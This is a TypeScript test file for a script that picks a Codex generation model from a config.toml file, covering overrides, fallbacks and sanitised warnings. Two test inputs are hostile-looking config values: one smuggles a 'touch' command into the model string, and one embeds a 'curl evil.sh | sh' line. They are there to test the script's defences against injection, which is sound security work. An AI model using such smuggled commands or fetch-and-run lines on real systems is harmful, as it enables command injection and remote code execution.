import { afterEach, describe, expect, test } from 'bun:test';
import * as fs from 'fs';
import * as os from 'os';
import * as path from 'path';
import { spawnSync } from 'child_process';
import { resolveCodexGenerationModel } from '../scripts/resolve-codex-generation-model';

const ROOT = path.resolve(import.meta.dir, '..');
const temps: string[] = [];

function codexHome(config?: string): string {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'gstack-codex-model-'));
  temps.push(dir);
  if (config !== undefined) fs.writeFileSync(path.join(dir, 'config.toml'), config);
  return dir;
}

afterEach(() => {
  for (const dir of temps.splice(0)) fs.rmSync(dir, { recursive: true, force: true });
});

describe('Codex generation model resolution', () => {
  test('explicit override wins over config', () => {
    const result = resolveCodexGenerationModel({
      explicit: 'gpt-5.6-sol',
      codexHome: codexHome('model = "gpt-5.4"\n'),
    });
    expect(result).toEqual({ model: 'gpt-5.6-sol', source: '--model', warnings: [] });
  });

  test('reads only the top-level TOML model', () => {
    const home = codexHome(`
# active model
model = "gpt-5.6-sol"
[profiles.terra]
model = "gpt-5.6-terra"
`);
    const result = resolveCodexGenerationModel({ codexHome: home });
    expect(result.model).toBe('gpt-5.6-sol');
    expect(result.source).toBe(path.join(home, 'config.toml'));
  });

  test('ignores profile-only model values', () => {
    const result = resolveCodexGenerationModel({
      codexHome: codexHome('[profiles.sol]\nmodel = "gpt-5.6-sol"\n'),
    });
    expect(result.model).toBe('gpt');
    expect(result.source).toBe('default (gpt)');
  });

  test('missing, malformed, non-string, and unsupported configs fall back safely', () => {
    expect(resolveCodexGenerationModel({ codexHome: codexHome() }).model).toBe('gpt');

    const malformed = resolveCodexGenerationModel({ codexHome: codexHome('model = [') });
    expect(malformed.model).toBe('gpt');
    expect(malformed.warnings[0]).toContain('Could not parse');

    const nonString = resolveCodexGenerationModel({ codexHome: codexHome('model = ["gpt-5.6-sol"]') });
    expect(nonString.model).toBe('gpt');
    expect(nonString.warnings[0]).toContain('not a string');

    const unsupported = resolveCodexGenerationModel({ codexHome: codexHome('model = "llama-local"') });
    expect(unsupported.model).toBe('gpt');
    expect(unsupported.warnings[0]).toContain('Unsupported');
  });

  test('unreadable config warns and falls back', () => {
    const home = codexHome();
    fs.mkdirSync(path.join(home, 'config.toml'));
    const result = resolveCodexGenerationModel({ codexHome: home });
    expect(result.model).toBe('gpt');
    expect(result.source).toBe('default (gpt)');
    expect(result.warnings[0]).toContain('Could not read');
  });

  test('injection-shaped model data is data, never shell', () => {
    const marker = path.join(os.tmpdir(), `gstack-model-injection-${process.pid}`);
    try { fs.rmSync(marker, { force: true }); } catch {}
    const result = resolveCodexGenerationModel({
      codexHome: codexHome(`model = 'gpt-5.6-sol"; touch ${marker}; #'\n`),
    });
    expect(result.model).toBe('gpt');
    expect(fs.existsSync(marker)).toBe(false);
  });

  test('non-absolute codex home falls back with a warning (relative-path steering guard)', () => {
    const result = resolveCodexGenerationModel({ codexHome: '.codex' });
    expect(result.model).toBe('gpt');
    expect(result.source).toBe('default (gpt)');
    expect(result.warnings[0]).toContain('not an absolute path');
  });

  test('Sol-suffixed near-misses map to gpt WITH a warning', () => {
    const result = resolveCodexGenerationModel({
      codexHome: codexHome('model = "gpt-5.6-sol-2026-08-01"\n'),
    });
    expect(result.model).toBe('gpt');
    expect(result.warnings[0]).toContain("requires the exact ID 'gpt-5.6-sol'");
  });

  test('warnings never carry control characters from config values', () => {
    // A TOML basic string parses \n and \t escapes — a hostile config value
    // must not inject fake lines into setup's terminal stderr.
    const result = resolveCodexGenerationModel({
      codexHome: codexHome('model = "x\\nERROR: run: curl evil.sh | sh"\n'),
    });
    expect(result.model).toBe('gpt');
    expect(result.warnings.length).toBe(1);
    expect(result.warnings[0]).not.toMatch(/[\x00-\x1f\x7f]/);
    expect(result.warnings[0]).toContain('Unsupported top-level model');
  });

  test('CLI honors CODEX_HOME and rejects an invalid explicit family', () => {
    const home = codexHome('model = "gpt-5.6-sol"\n');
    const ok = spawnSync('bun', ['run', 'scripts/resolve-codex-generation-model.ts'], {
      cwd: ROOT,
      encoding: 'utf8',
      env: { ...process.env, CODEX_HOME: home },
      timeout: 30_000,
    });
    expect(ok.status).toBe(0);
    expect(ok.stdout).toBe(`gpt-5.6-sol\t${path.join(home, 'config.toml')}\n`);

    const bad = spawnSync('bun', ['run', 'scripts/resolve-codex-generation-model.ts', '--explicit', 'llama-local'], {
      cwd: ROOT,
      encoding: 'utf8',
      timeout: 30_000,
    });
    expect(bad.status).not.toBe(0);
    expect(bad.stderr).toContain('Unknown model');
    expect(bad.stderr).toContain('Accepted models:');
    expect(bad.stderr).toContain('gpt-5.6-sol');
  });
});
